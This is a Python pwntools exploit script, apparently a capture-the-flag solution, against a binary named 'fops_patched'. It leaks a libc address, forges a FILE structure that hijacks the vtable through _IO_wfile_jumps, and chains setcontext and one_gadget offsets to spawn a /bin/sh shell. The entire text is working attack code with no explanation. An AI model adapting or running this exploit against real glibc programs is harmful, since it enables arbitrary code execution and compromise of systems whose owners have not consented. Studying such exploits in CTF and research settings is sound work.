#!/usr/bin/env python3
from pwn import *

elf = ELF('./fops_patched')
libc = ELF('./libc.so.6')
context.binary = elf

#io = remote("0.cloud.chals.io", 13318)
io = process('./fops_patched')

io.recvuntil(": ")
stdout = int(io.recvline(), 16)
print(hex(stdout))

libc_base = stdout - 0x1d67a0
libc.address = stdout - 0x1d67a0

print(f"libc_base: {hex(libc_base)}")

fake_vtable = libc.sym._IO_wfile_jumps 

"""
pwndbg> x 0x7f64d5df63e8 + 0x18
0x7f64d5df6400 <_IO_wfile_jumps+24>:    0x00007f64d5c9f980
pwndbg> x/gx 0x00007f64d5c9f980
0x7f64d5c9f980 <__GI__IO_wfile_overflow>:       0xe5894855fa1e0ff3
pwndbg>
"""

call_gadget = libc.address + 0x14a10e # mov rdx,QWORD PTR [rax+0x38] ; mov rdi,rax ; call QWORD PTR [rdx+0x20] 
setcontext_gadget = libc.symbols['setcontext'] + 87
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))

payload = b""
fileptr = stdout - 0x10

one_gadget = [0x4deab, 0x4deb2, 0xd6cd4]

payload = b"".join([
    p64(0x3b01010101010101), 
    p64(0x0),
    p64(0x0),                  # _IO_write_base
    p64(0x1),                  # _IO_write_ptr
    p64(0x0),
    p64(0x0),
    p64(stdout + 0x38 - 0x20),
    p64(setcontext_gadget),
    p64(0x0),
    p64(0x0),
    p64(0x0),
    p64(0x0),
    p64(call_gadget),
    p64(fileptr),
    p64(0x0),
    p64(stdout + 0x1000),     # _lock (quit)
    p64(binsh),               # como argumento de rdi 
    p64(stdout + 0x1008),
    p64(fileptr),             # _wide_data
    p64(0x0),
    p64(0x0),
    p64(0x0),
    p64(0x0),
    p64(0x0),
    p64(libc_base + one_gadget[0]),
    p64(fake_vtable),
    p64(fileptr + 0x10 -8)
])

input("PAUSE")
io.send(payload)

io.interactive()

